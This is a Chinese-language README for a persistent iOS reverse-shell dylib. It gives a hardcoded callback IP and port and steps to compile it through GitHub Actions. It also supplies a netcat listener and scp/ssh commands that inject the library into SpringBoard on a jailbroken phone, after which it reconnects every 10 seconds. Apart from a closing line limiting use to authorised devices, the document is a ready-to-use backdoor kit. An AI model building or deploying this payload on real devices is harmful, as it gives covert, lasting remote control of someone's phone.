# iOS 反向 shell dylib（GitHub Actions 云端编译）

dylib 内 fork + 反向 shell，不释放任何文件，最终执行系统自带 shell。

## 回连参数（已写死在 reverse_shell.c）
- LHOST = 192.168.110.78
- LPORT = 4444
- 若要改，编辑 reverse_shell.c 顶部的 LHOST/LPORT

## 步骤（网页版）

1. GitHub 新建 Public 仓库；
2. Add file -> Upload files，上传本目录的普通文件：
   Makefile、payload.plist、reverse_shell.c、README.md；
3. 再 Add file -> Create new file，文件名输入
   .github/workflows/build.yml
   粘贴 build.yml 内容并提交；
4. Actions 标签里等编译完成（绿色对勾）；
5. 点运行记录，底部 Artifacts 下载 payload-dylib，解压。

## 监听端（电脑，普通 netcat，不需要 meterpreter）
```bash
nc -lvnp 4444
```

## 部署（注入 SpringBoard）
```bash
scp payload.dylib payload.plist root@手机IP:/var/jb/Library/MobileSubstrate/DynamicLibraries/
ssh root@手机IP "chmod 644 /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.*; sbreload"
```
respring 后 netcat 收到连接，得到 shell。断开后 dylib 每 10 秒自动重连。

## 卸载
```bash
ssh root@手机IP "rm -f /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.dylib /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.plist; sbreload"
```

仅限本人所有、已授权设备的安全研究。
